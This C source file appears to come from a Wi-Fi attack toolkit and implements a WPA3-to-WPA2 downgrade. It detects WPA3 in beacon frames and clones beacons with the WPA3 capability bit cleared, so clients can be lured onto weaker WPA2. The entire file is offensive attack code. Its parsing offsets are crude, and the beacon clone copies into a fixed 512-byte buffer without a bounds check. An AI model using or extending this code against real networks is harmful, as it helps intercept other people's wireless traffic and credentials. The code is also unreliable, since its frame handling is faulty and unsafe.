#include "wpa3_downgrade.h"
#include <stdio.h>
#include <string.h>

static wpa3_downgrade_config_t cfg;
static bool running = false;

void wpa3_downgrade_init(void) {
    memset(&cfg, 0, sizeof(cfg));
    cfg.timeout_ms = 30000;
    cfg.force_wpa2 = true;
}

void wpa3_downgrade_start(wpa3_downgrade_config_t* c) {
    if (c) memcpy(&cfg, c, sizeof(cfg));
    running = true;
    printf("[WPA3-DOWNGRADE] Targeting %s, forcing WPA2\n", cfg.target_ssid);
}

void wpa3_downgrade_stop(void) {
    running = false;
    printf("[WPA3-DOWNGRADE] Stopped\n");
}

bool wpa3_downgrade_is_wpa3(uint8_t* beacon_frame, uint16_t len) {
    for (uint16_t i = 0; i < len - 4; i++) {
        if (beacon_frame[i] == 0x30 && beacon_frame[i+1] == 0x14 &&
            beacon_frame[i+2] == 0x01 && beacon_frame[i+3] == 0x00) {
            if (beacon_frame[i+7] & 0x04) return true;
        }
    }
    return false;
}

uint8_t* wpa3_downgrade_clone_beacon(uint8_t* original, uint16_t len, uint16_t* out_len) {
    static uint8_t cloned[512];
    memcpy(cloned, original, len);
    for (uint16_t i = 0; i < len - 4; i++) {
        if (cloned[i] == 0x30 && cloned[i+1] == 0x14) {
            cloned[i+7] &= ~0x04;
            *out_len = len;
            return cloned;
        }
    }
    *out_len = len;
    return cloned;
}
